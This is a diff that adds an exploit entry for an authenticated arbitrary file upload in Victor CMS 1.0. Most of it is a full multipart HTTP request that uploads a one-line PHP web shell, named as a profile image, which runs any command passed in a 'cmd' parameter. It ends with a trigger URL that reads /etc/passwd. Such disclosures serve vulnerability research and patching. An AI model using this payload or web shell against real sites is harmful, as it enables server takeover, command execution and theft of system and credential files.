@@ -1,0 +1,67 @@
+# Exploit Title: Victor CMS 1.0 - Authenticated Arbitrary File Upload
+# Google Dork: N/A
+# Date: 2020-05-19
+# Exploit Author: Kishan Lal Choudhary
+# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
+# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
+# Version: 1.0
+# Tested on: Windows 10
+
+Description: The GET parameter '/admin/users.php?source=add_user' is vulnerable Arbitary File Uploads
+
+
+POST /admin/users.php?source=add_user HTTP/1.1
+Host: localhost
+Content-Length: 1049
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrMPNq33u6rCpEFhB
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://localhost/admin/users.php?source=add_user
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en;q=0.9,en-US;q=0.8,fr;q=0.7
+Cookie: PHPSESSID=cjpan858fghefnjse7qv1j3v72
+Connection: close
+
+------WebKitFormBoundaryrMPNq33u6rCpEFhB
+Content-Disposition: form-data; name="user_name"
+
+test
+------WebKitFormBoundaryrMPNq33u6rCpEFhB
+Content-Disposition: form-data; name="user_firstname"
+
+test
+------WebKitFormBoundaryrMPNq33u6rCpEFhB
+Content-Disposition: form-data; name="user_lastname"
+
+test
+------WebKitFormBoundaryrMPNq33u6rCpEFhB
+Content-Disposition: form-data; name="user_image"; filename="exp.php"
+Content-Type: application/octet-stream
+
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+------WebKitFormBoundaryrMPNq33u6rCpEFhB
+Content-Disposition: form-data; name="user_role"
+
+Admin
+------WebKitFormBoundaryrMPNq33u6rCpEFhB
+Content-Disposition: form-data; name="user_email"
+
+test@tets.com
+------WebKitFormBoundaryrMPNq33u6rCpEFhB
+Content-Disposition: form-data; name="user_password"
+
+test@1234
+------WebKitFormBoundaryrMPNq33u6rCpEFhB
+Content-Disposition: form-data; name="create_user"
+
+Add User
+------WebKitFormBoundaryrMPNq33u6rCpEFhB--
+
+
+
+The Shell can be triggered by visting
+
+http://localhost/img/exp.php?cmd=cat%20/etc/passwd
